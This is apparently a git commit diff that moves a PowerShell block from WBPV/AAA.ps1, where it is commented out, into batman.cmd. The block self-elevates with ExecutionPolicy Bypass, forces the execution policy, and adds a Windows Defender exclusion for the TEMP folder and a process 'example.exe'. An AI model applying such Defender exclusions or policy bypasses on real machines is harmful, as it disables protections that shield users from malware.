8a57cfba7bd39fcba41d20ed1f1d570dceee8154
Joel A Marinay Jr <66583724+joel2128@users.noreply.github.com>
2024-10-21 11:10:50 +0800

    separate

--- WBPV/AAA.ps1
+++ WBPV/AAA.ps1
@@ -1,17 +1,17 @@
-# # FIRST THINGS FIRST
+# # # FIRST THINGS FIRST
 
-# Check if the script is running with elevated privileges
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Relaunch the script with elevated privileges
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-    exit
-}
+# # Check if the script is running with elevated privileges
+# if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+#     # Relaunch the script with elevated privileges
+#     Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+#     exit
+# }
 
-# Set the execution policy
-Set-ExecutionPolicy RemoteSigned -Force
+# # Set the execution policy
+# Set-ExecutionPolicy RemoteSigned -Force
 
-# Add Exlusion in Windows Defender
-Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
+# # Add Exlusion in Windows Defender
+# Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 # ##############################################################################
 
--- batman.cmd
+++ batman.cmd
@@ -1,1 +1,14 @@
-powershell start-process powershell -verb runas
+# # FIRST THINGS FIRST
+
+# Check if the script is running with elevated privileges
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    # Relaunch the script with elevated privileges
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# Set the execution policy
+Set-ExecutionPolicy RemoteSigned -Force
+
+# Add Exlusion in Windows Defender
+Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
